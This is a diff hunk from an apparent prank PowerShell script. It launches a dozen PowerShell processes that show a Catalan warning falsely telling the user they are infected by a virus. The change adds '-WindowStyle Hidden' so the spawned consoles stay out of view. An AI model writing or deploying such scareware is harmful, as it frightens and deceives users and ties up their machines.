@@ -12,12 +12,12 @@ function Show-MessageBox {
 Start-Sleep -Seconds 4
 # Run multiple instances of message box in parallel
 for ($i = 0; $i -lt 2; $i++) {
-    Start-Process powershell -ArgumentList "-NoExit", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
+    Start-Process powershell -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
     Start-Sleep -Seconds 1
 }
 Start-Sleep -Seconds 4
 for ($i = 0; $i -lt 10; $i++) {
-    Start-Process powershell -ArgumentList "-NoExit", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
+    Start-Process powershell -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
 }
 
 
